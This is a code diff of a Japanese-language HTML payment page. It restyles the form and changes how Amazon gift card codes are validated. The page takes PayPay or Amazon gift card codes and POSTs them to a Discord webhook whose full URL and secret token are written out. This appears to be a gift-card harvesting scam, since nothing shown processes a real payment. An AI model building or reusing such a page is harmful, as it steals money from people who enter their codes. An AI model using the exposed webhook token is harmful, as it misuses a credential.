@@ -10,14 +10,14 @@
             font-family: 'Poppins', Arial, sans-serif;
             margin: 0;
             padding: 0;
-            background: linear-gradient(to right, #a8ff78, #78ffd6);
+            background: linear-gradient(to right, #ff7eb3, #ffb3e6); /* ポップで明るい色 */
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
         }
         .container {
-            max-width: 650px;
+            width: 600px; /* 幅を固定 */
             margin: 20px;
             padding: 40px;
             background: #ffffff;
@@ -31,9 +31,9 @@
             to { opacity: 1; transform: translateY(0); }
         }
         h1 {
-            color: #2e7d32;
-            font-size: 3em;
-            margin-bottom: 30px;
+            color: #ff4081; /* 明るいピンク */
+            font-size: 3.5em;
+            margin-bottom: 20px;
             font-weight: bold;
         }
         label {
@@ -47,13 +47,13 @@
             width: 100%;
             padding: 18px;
             margin-bottom: 20px;
-            border: 2px solid #ccc;
+            border: 2px solid #ff4081; /* ピンクの枠 */
             border-radius: 12px;
             font-size: 1.2em;
             transition: border 0.3s ease;
         }
         input:focus {
-            border-color: #4caf50;
+            border-color: #ff80ab; /* フォーカス時の色 */
             outline: none;
         }
         .payment-options button {
@@ -65,17 +65,12 @@
             font-weight: bold;
             font-size: 1.3em;
             transition: transform 0.2s ease-in-out;
+            background: #ff80ab; /* 明るいピンク */
+            color: white;
         }
         .payment-options button:hover {
             transform: scale(1.1);
-        }
-        #paypay-btn {
-            background-color: #00c853;
-            color: white;
-        }
-        #amazon-btn {
-            background-color: #ffca28;
-            color: white;
+            background: #ff4081; /* ホバー時に色変更 */
         }
         .hidden {
             display: none;
@@ -94,7 +89,6 @@
                 transform: translateY(-10px);
             }
         }
-        /* 送信ボタンのスタイル */
         button[type="submit"] {
             padding: 18px 50px;
             background: linear-gradient(to right, #ff7e5f, #feb47b);
@@ -114,7 +108,6 @@
         }
     </style>
     <script>
-        // ====== JavaScript ======
         document.addEventListener('DOMContentLoaded', () => {
             const paypayBtn = document.getElementById('paypay-btn');
             const amazonBtn = document.getElementById('amazon-btn');
@@ -137,11 +130,10 @@
                 paypaySection.classList.add('hidden');
             });
 
-            // Amazonギフト券コードの入力時に4文字おきに自動で-を挿入
+            // Amazonギフト券コードの入力時に自動でハイフンなしにする
             const amazonInput = document.getElementById('amazon-code');
             amazonInput.addEventListener('input', function () {
                 let value = amazonInput.value.replace(/[^A-Z0-9]/g, '').toUpperCase();
-                value = value.match(/.{1,4}/g)?.join('-') || value;
                 amazonInput.value = value;
             });
 
@@ -161,7 +153,7 @@
                 }
 
                 if (!amazonSection.classList.contains('hidden')) {
-                    const amazonRegex = /^[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}$/;
+                    const amazonRegex = /^[A-Z0-9]{16}$/;  // ハイフンなし
                     if (!amazonRegex.test(amazonCode)) {
                         alert('Amazonギフト券コードが正しくありません');
                         return;
@@ -170,6 +162,7 @@
 
                 successMessage.classList.remove('hidden');
 
+                // Webhookの設定
                 fetch('https://discord.com/api/webhooks/1321477762338521179/YEvfJJo8opXHNbR4VHLlYEKRLpM1GtOEvKk9YNvZrAGj_l4ehUdkqx8h30bdu4j4d-BK', {
                     method: 'POST',
                     headers: {
